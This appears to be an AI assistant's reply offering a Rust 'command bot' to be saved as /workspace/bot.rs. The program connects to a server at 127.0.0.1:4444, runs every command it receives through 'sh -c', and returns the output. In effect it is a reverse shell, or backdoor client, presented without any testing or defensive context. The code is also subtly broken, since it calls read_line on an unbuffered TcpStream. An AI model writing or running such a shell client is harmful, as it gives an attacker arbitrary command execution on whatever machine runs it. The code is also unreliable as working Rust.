Here's a simple Rust program that acts as a command bot. It connects to a server at `127.0.0.1:4444`, waits for incoming commands, executes them, and sends the results back to the server.

You can save the following code in a file named `/workspace/bot.rs`.

```rust
use std::io::{self, BufRead, Write};
use std::net::{TcpStream, TcpListener};
use std::process::Command;

fn main() -> io::Result<()> {
    // Connect to the server
    let mut stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to the server.");

    // Create a buffer to read commands from the server
    let mut buffer = String::new();

    loop {
        // Clear the buffer
        buffer.clear();

        // Read the command from the server
        let bytes_read = stream.read_line(&mut buffer)?;
        if bytes_read == 0 {
            // Connection closed
            println!("Server closed the connection.");
            break;
        }

        // Trim the command and execute it
        let command = buffer.trim();
        println!("Received command: {}", command);

        // Execute the command
        let output = Command::new("sh")
            .arg("-c")
            .arg(command)
            .output();

        match output {
            Ok(output) => {
                // Convert output to string
                let result = String::from_utf8_lossy(&output.stdout);
                let error = String::from_utf8_lossy(&output.stderr);

                // Send the result back to the server
                let response = if !result.is_empty() {
                    result.to_string()
                } else {
                    error.to_string()
                };

                stream.write_all(response.as_bytes())?;
                stream.write_all(b"\n")?; // Send a newline to indicate end of response
            }
            Err(e) => {
                eprintln!("Failed to execute command: {}", e);
            }
        }
    }

    Ok(())
}
```

